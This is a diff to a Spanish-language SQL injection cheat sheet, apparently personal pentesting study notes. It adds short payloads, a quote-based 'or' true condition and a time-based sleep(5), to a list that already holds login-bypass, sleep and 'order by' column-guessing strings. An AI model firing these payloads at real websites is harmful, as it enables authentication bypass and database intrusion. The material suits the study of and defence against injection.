@@ -44,7 +44,9 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 * Un indicio de inyeccion SQL es encontrar en la url **.php?id=** No es necesario que diga **id** tambien puede tener otro parametro. 
 
 ```bash
+❯ ' or '1'='1                                         # La mas sencilla y nos devolveria un true, dejamos una comilla sin cerrar ya que la propia query la cerrara
 ❯ ' or 1=1-- -                                        # La mas sencilla y nos devolveria un true, aveces hace bypass en el panel de autenticacion 
+❯ ' or sleep(5)-- -                                   # Haremos que tarde en responder la web 5 segundos
 ❯ ' and sleep(5)-- -                                  # Haremos que tarde en responder la web 5 segundos
 ❯ ' order by 100-- -                                  # Haremos un ordenamiento con la 100va columna e iremos adivinando hasta que no nos marque un error
 ```
